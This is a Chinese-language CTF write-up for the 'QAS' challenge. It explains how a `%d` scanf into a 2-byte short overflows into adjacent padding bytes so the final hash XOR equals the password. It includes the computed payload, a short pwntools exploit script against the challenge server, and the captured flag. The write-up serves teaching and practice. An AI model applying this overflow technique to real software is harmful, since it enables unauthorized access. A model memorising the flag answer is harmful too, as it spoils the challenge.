# QAS

## 题目简述

题目实现了一个被大量 typedef 包装的“量子认证”程序。目标是让 `quantum_hash(qdata.input, ...)` 等于固定密码 `0x555`。漏洞不在复杂的哈希过程，而在 `scanf("%d", (int *)&qdata.input.val)`：目标字段实际只有 2 字节，`%d` 却写入 4 字节，从而覆盖紧随其后的两个 `padding` 字节。

## 解题过程

去掉混淆别名后，关键结构为：

```c
typedef struct {
    short val;                 // offset 0, 2 bytes
    unsigned char padding[2];  // offset 2, 2 bytes
    unsigned char checksum;
    unsigned char reserved;
} INPUT_QUANTUM;
```

`quantum_data_s` 带有 `packed` 属性，因此 `scanf` 写入的 4 字节会精确覆盖 `val` 和 `padding`，但不会碰到后面的密码字段。哈希末尾为：

```c
hash |= 0xeee;
hash ^= input.padding[0] << 8 | input.padding[1];
```

若 `padding` 保持初始化值 0，按位或操作会强制低 12 位中的若干位为 1，不可能得到 `0x555`。但溢出允许我们选择最终异或掩码。

官方 healthcheck 使用 32 位值 `0xaa9a0001`。在小端序内存中，它被拆为：

```text
val        = 0x0001
padding[0] = 0x9a
padding[1] = 0xaa
```

固定熵序列是：

```text
91 0b d7 3d 68 c2 95 2b
```

代入 `val = 1` 后，`hash |= 0xeee` 的结果为 `0x9fff`，随后：

$$
0x9fff \oplus ((0x9a\ll 8)\mathbin{|}0xaa)
=0x9fff\oplus0x9aaa
=0x555.
$$

为避免把超出 `int` 正范围的十进制数交给 `%d`，可以发送同一位模式对应的有符号值 `-1432748031`：

```python
from pwn import remote

r = remote("qas.chal.uiuc.tf", 1337, ssl=True)
r.sendlineafter(b"code: ", b"-1432748031")
r.interactive()
```

认证通过后程序读取 `flag.txt`，得到：

```text
uiuctf{qu4ntum_0v3rfl0w_2d5ad975653b8f29}
```

## 方法总结

- 核心技巧：检查格式化输入的真实目标类型，利用 `%d` 对 2 字节 `short` 的越界写控制相邻字段。
- 识别信号：复杂 typedef、`packed` 结构和强制指针转换同时出现时，应先还原字段大小与偏移，而不是被业务命名误导。
- 复用要点：构造整数载荷时要同时考虑十进制解析、32 位补码和目标机器字节序；最后按程序的实际运算顺序复算目标值。
